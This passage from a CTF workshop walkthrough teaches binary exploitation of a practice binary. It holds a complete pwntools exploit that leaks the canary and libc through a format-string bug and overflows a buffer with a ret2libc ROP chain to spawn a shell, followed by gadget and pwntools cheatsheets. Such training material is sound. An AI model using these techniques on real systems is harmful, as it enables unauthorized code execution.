
# ── Connect ────────────────────────────────────────────────────────────────────
p = process('./e0l_patched')       # run locally
# p = remote('localhost', 9999)    # connect to Docker server (uncomment to use)

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 1: Leak canary and libc address using format string vulnerability
# ══════════════════════════════════════════════════════════════════════════════
# We use option 1 (diagnostics) which calls printf(buffer) — the vulnerable function.
# %23$p reads stack position 23 = diagnostics()'s canary (ends in 00)
# %33$p reads stack position 33 = a libc address (libc_base + 0x29d90)

p.sendlineafter(b'> ', b'1')                   # select option 1
p.sendlineafter(b'Command: ', b'%23$p|%33$p')  # leak canary and libc in one shot

output    = p.recvline().decode().strip()
print(f'[*] Raw leak: {output}')

parts     = output.split('|')
canary    = int(parts[0], 16)
libc_leak = int(parts[1], 16)

# libc_base = leaked_address - known_offset_of_that_address_within_libc
libc.address = libc_leak - 0x29d90

log.success(f'Canary:    {hex(canary)}')
log.success(f'Libc base: {hex(libc.address)}')

# Sanity checks
assert hex(libc.address).endswith('000'), 'Bad libc base!'
assert hex(canary).endswith('00'),        'Bad canary!'

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 2: Calculate gadget addresses
# ══════════════════════════════════════════════════════════════════════════════

ret     = 0x40101a                           # simple ret gadget — in binary, fixed (No PIE)
pop_rdi = libc.address + 0x2a3e5            # pop rdi; ret — in libc (ASLR → use libc_base)
system  = libc.sym['system']                # system() — pwntools looks up symbol automatically
binsh   = next(libc.search(b'/bin/sh'))     # "/bin/sh" string — pwntools finds it in libc

log.info(f'ret:     {hex(ret)}')
log.info(f'pop_rdi: {hex(pop_rdi)}')
log.info(f'system:  {hex(system)}')
log.info(f'binsh:   {hex(binsh)}')

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 3: Build the overflow payload
# ══════════════════════════════════════════════════════════════════════════════
#
# execute_payload() stack layout:
#
#   rbp - 0x50  ← buffer starts here
#   rbp - 0x08  ← canary (72 bytes from buffer start: 0x50 - 0x08 = 0x48 = 72)
#   rbp + 0x00  ← saved RBP
#   rbp + 0x08  ← return address  ← our ROP chain goes here
#
# Payload structure:
#   [72 bytes padding] + [canary] + [saved RBP] + [ret] + [pop rdi] + [/bin/sh] + [system]

payload  = b'A' * 72          # fill buffer up to the canary
payload += p64(canary)         # restore canary so the stack check passes
payload += p64(0)              # overwrite saved RBP (any value is fine here)
payload += p64(ret)            # ret gadget — fixes 16-byte stack alignment for system()
payload += p64(pop_rdi)        # pop rdi; ret — loads next stack value into RDI
payload += p64(binsh)          # this gets popped into RDI ("/bin/sh" address)
payload += p64(system)         # ret from pop_rdi jumps here → system("/bin/sh") !!

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 4: Send the payload
# ══════════════════════════════════════════════════════════════════════════════

p.sendlineafter(b'> ', b'2')       # select option 2 (execute_payload)
p.sendafter(b'Payload: ', payload) # send payload WITHOUT newline (read() not scanf)

# ══════════════════════════════════════════════════════════════════════════════
# PHASE 5: Interact with our shell
# ══════════════════════════════════════════════════════════════════════════════

p.interactive()   # hand control to us — we now have a shell!
```

---

### Step 4: Run the Exploit

```bash
python3 exploit.py
```

Expected output:
```
[*] Raw leak: 0xd3ac9d5b62541e00|0x7f08a5629d90
[+] Canary:    0xd3ac9d5b62541e00
[+] Libc base: 0x7f08a5600000
[*] ret:     0x40101a
[*] pop_rdi: 0x7f08a562a3e5
[*] system:  0x7f08a5650d70
[*] binsh:   0x7f08a57d8678
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
CYNX{f0rm4t_str1ng_t0_c4n4ry_l34k_t0_r0p_ch41n_pwn3d}
```

---

### Step 5: Exploit Against the Docker Server

Start the Docker server:

```bash
docker build -t e0l .
docker run -p 9999:9999 e0l
```

In `exploit.py`, switch to remote:

```python
# Comment out:
# p = process('./e0l_patched')

# Uncomment:
p = remote('localhost', 9999)
```

Then run:

```bash
python3 exploit.py
```

---

## Quick Reference

### Binary Analysis Commands

```bash
# What type of file is this?
file <binary>

# What security protections does it have?
checksec --file=<binary>

# Disassemble a function (show assembly)
objdump -d <binary> | grep -A 40 "<function_name>:"

# List all functions and symbols
readelf -s <binary>

# Find a specific symbol in libc
readelf -s libc.so.6 | grep " system"
```

### Finding ROP Gadgets

```bash
# Find a specific gadget in a binary
ROPgadget --binary <binary> --only "pop|ret" | grep "pop rdi"

# Find a simple ret gadget (for alignment)
ROPgadget --binary <binary> --only "ret" | head -5

# Find a string inside a binary/libc
ROPgadget --binary libc.so.6 --string "/bin/sh"
```

### pwntools Cheatsheet

```python
from pwn import *

# Load binary and libc
elf  = ELF('./binary')
libc = ELF('./libc.so.6')
context.binary = elf        # sets architecture automatically

# Connect
p = process('./binary')         # local
p = remote('host', 1337)        # remote

# Send data
p.sendlineafter(b'prompt', b'data')   # wait for "prompt", send "data" + newline
p.sendafter(b'prompt', payload)       # wait for "prompt", send payload (no newline)

# Receive data
line = p.recvline()                   # receive one line (up to \n)
p.recvuntil(b'marker')               # receive and discard until "marker"

# Pack addresses (little-endian — always use this for 64-bit addresses!)
p64(0x401234)   # pack a 64-bit integer as 8 bytes, little-endian
p32(0x1234)     # pack a 32-bit integer

# Find symbols / strings (after setting libc.address)
libc.sym['system']              # address of system()
next(libc.search(b'/bin/sh'))   # address of /bin/sh string in libc

# Get a shell
p.interactive()
```

### Payload Template for This Challenge

```
padding (72 bytes) + canary (8 bytes) + fake_rbp (8 bytes) + ret + pop_rdi + binsh + system
```

```python
payload  = b'A' * 72
payload += p64(canary)
payload += p64(0)
payload += p64(0x40101a)                     # ret (alignment)
payload += p64(libc.address + 0x2a3e5)       # pop rdi; ret
payload += p64(next(libc.search(b'/bin/sh')))# /bin/sh address
payload += p64(libc.sym['system'])           # system()
```

---

## Summary: The Full Attack Chain

```
Step 1: Format String (diagnostics)
        Send: %23$p|%33$p
        Get:  canary + libc_leak

Step 2: Calculate
        libc_base = libc_leak - 0x29d90
        system    = libc_base + 0x50d70
        binsh     = libc_base + 0x1d8678
        pop_rdi   = libc_base + 0x2a3e5
        ret       = 0x40101a

Step 3: Buffer Overflow (execute_payload)
        Send: 'A'*72 + canary + p64(0) + ret + pop_rdi + binsh + system

Step 4: Get shell → cat flag.txt
```

---

## Where to Learn More

| Resource | What it covers |
|----------|---------------|
| [pwn.college](https://pwn.college) | Free, structured binary exploitation course — start here |
| [ir0nstone's gitbook](https://ir0nstone.gitbook.io/notes) | Excellent beginner notes on ROP and buffer overflows |
| [LiveOverflow on YouTube](https://www.youtube.com/@LiveOverflow) | Video walkthroughs of CTF challenges |
| [picoCTF](https://picoctf.org) | Beginner-friendly CTF with many pwn challenges |
| [pwnable.kr](http://pwnable.kr) | Classic pwn practice challenges |

---

*Workshop by Low Ze Xuan — GDGOC APU Cyber Security Department*
